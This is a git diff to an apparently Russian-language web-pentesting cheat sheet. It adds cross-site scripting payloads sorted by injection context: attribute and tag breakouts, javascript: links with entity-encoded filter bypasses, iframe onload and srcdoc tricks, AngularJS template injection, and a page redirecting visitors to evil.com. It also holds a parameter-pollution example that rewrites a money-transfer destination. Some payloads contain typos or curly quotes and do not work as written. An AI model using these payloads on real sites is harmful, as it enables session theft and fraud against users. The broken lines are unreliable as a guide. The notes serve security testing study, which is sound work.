@@ -112,6 +112,7 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 '":;<>/\[]<script><h1>
 ''`;!--"<XSS>=&{()}
 
+Html Entities
 < - &lt;
 > - &gt;
 & - &amp;
@@ -143,13 +144,66 @@ $     %24
 "     %22
 space %20
 
+
+Основные методы вызова javascript из html
+
+<script>...</script>
+<img onerror="..." src="x">test</a> - обработчик событий
+<a href="javascript:...">click to trigger javascript</> - через ссылки
+<iframe src="javascript:..." - через  iframe
+
+<script>...</script> - БД - Html template DB call - DOM(user's browser) - <script>...</script>
+
+xss между тэгами разметки
 <script>alert(5)</script>
 
+xss внутри значения аттрибута
 "><script>alert(5)</script>
 
+xss между специфичных тэгов (title / style / noscript / textarea)
+"></title><script>alert(5)</script>
+
+xss внутри тега script
+"></script></title><script>alert(5)</script>
+";+alert();//
 ;alert()
 
+xss особенности HTML (одинарное / двойные кавычки)
+'"></script></title><script>alert(5)</script>
+
+xss внутри значения аттрибута
+'%20autofocus%20onfocus='alert(); - onfocus не будет работать если у тэга input есть аттрибут type=hidden
+' " onfocus='alert()' autofocus
+
+xss внутри ссылки (гиперссылки / редиректы(?returnUrl=...))
 <a href="javascript:alert(1)">
+<a href="javascript://site.com/%0aalert()">Back</a>
+javascript: = &#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&colon;//site.com/%0aalert()
+%20javascript:alert(1)
+%09javascript:alert(1)
+
+iframe + обработчик (iframe - используется для того чтобы отобразить страницу внутри другой страницы)
+'"></title></script><iframe onload='alert’’'>
+<iframe srcdoc="&#x3C;script&#x3E;alert()&#x3C;/script&#x3E;">
+'"></title/</script/</style/><iframe/onload='alert’’'>
+
+Пробелы между аттрибутами в тэге могут заменить слэшем
+<iframe/onload='alert()' - необязательно закрывать тэг
+
+xss попадает внутрь комментария
+'"></title/</script/</style/--><iframe/onload='alert’’'>
+
+xss AngularJS/VueJs (F12 - Console - angular.version)
+{{7*7}}
+{{constractor.constractor('alert()')()}}
+
+
+'"/test/></title/</script/</style/-->{{7*7}}<iframe/onload='alert’’'<!--
+
+Добавить код через расширение
+if(document.querySelectorAll('*[test]').length>0){
+prompt('XSS');
+}
 
 NULL <scri%00pt>alert()</scri%00pt>
 
@@ -315,6 +369,17 @@ index.php?go=javascript:alert(document.domain)
 ?page=javascript:alert(document.location)
 
 edit?image=http://securityidiots.com?vimeocdn.com/.png - ссылалось на сайт vimeocdn.com с любым разрешением
+
+<iframe src="https://.../..html> - ..html -  содержит код
+
+<!DOCTYPE html>
+...
+...
+<body>
+<script>top.window.location = "https://evil.com";<script>
+</body>
+...
+...
 ```
 
 **Link filter protection bypass**
@@ -660,7 +725,7 @@ Parameter pollution in social sharing buttons
     https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal-and-impact?&u=https://vk.com/durov
     https://hackerone.com/blog/introducing-signal-and-impact?&u=https://vk.com/durov&text=another_site:https://vk.com/durov
 
-Есть сайт https://www.example.com/transferMoney.php, который через метод POST принимает следующие параметры:
+Есть сайт https://www.example.com/transferMoney.php, который через метод POST принимает следующие параметры:
 
     amount=1000&fromAccount=12345
 
@@ -668,7 +733,7 @@ Parameter pollution in social sharing buttons
 
     amount=1000&fromAccount=12345&toAccount=99999
 
-Сайт, уязвимый к HPP атаке передаст запрос бэкенду в таком виде и второй параметр toAccount перезапишет запрос к бэкенду:
+Сайт, уязвимый к HPP атаке передаст запрос бэкенду в таком виде и второй параметр toAccount перезапишет запрос к бэкенду:
 
     toAccount=9876&amount=1000&fromAccount=12345&toAccount=99999
 ```
